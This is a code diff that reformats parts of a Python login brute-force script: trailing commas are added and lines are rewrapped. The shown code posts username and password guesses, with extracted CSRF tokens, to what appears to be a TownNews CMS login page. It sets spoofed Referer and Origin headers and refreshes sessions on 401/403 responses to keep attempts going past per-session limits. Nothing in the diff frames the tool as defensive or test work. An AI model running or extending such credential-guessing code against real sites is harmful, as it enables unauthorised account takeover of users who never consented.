@@ -10,7 +10,7 @@ from settings import (
     PASSWORD_PARAM_STRING,
     CSRF_PARAM_STRING,
     DELAY_BETWEEN_REQUESTS,
-    MAX_ATTEMPTS_PER_SESSION
+    MAX_ATTEMPTS_PER_SESSION,
 )
 
 
@@ -19,7 +19,7 @@ def try_login(
     known_success: Set[str],
     username: str,
     password: str,
-    attempt_counter: int
+    attempt_counter: int,
 ) -> Tuple[bool, int]:
     """
     Attempt login and refresh session periodically.
@@ -36,16 +36,18 @@ def try_login(
     payload = {
         USERNAME_PARAM_STRING: username,
         PASSWORD_PARAM_STRING: password,
-        "redirect": form_values.get("redirect", "/apps/tncms/login.cms")
+        "redirect": form_values.get("redirect", "/apps/tncms/login.cms"),
     }
     csrf_val = extract_csrf(form_values)
     if csrf_val:
         payload[CSRF_PARAM_STRING] = csrf_val
 
-    session.headers.update({
-        "Referer": LOGIN_PAGE_URL,
-        "Origin": f"https://{LOGIN_PAGE_URL.split('://')[1].split('/')[0]}"
-    })
+    session.headers.update(
+        {
+            "Referer": LOGIN_PAGE_URL,
+            "Origin": f"https://{LOGIN_PAGE_URL.split('://')[1].split('/')[0]}",
+        }
+    )
 
     try:
         resp = session.post(post_url, data=payload, timeout=15)
@@ -54,7 +56,9 @@ def try_login(
 
         if resp.status_code in (401, 403):
             print("[*] Session expired, refreshing...")
-            session, attempt_counter = refresh_session(session, MAX_ATTEMPTS_PER_SESSION)
+            session, attempt_counter = refresh_session(
+                session, MAX_ATTEMPTS_PER_SESSION
+            )
             return False, attempt_counter
 
         if resp.status_code != 200:
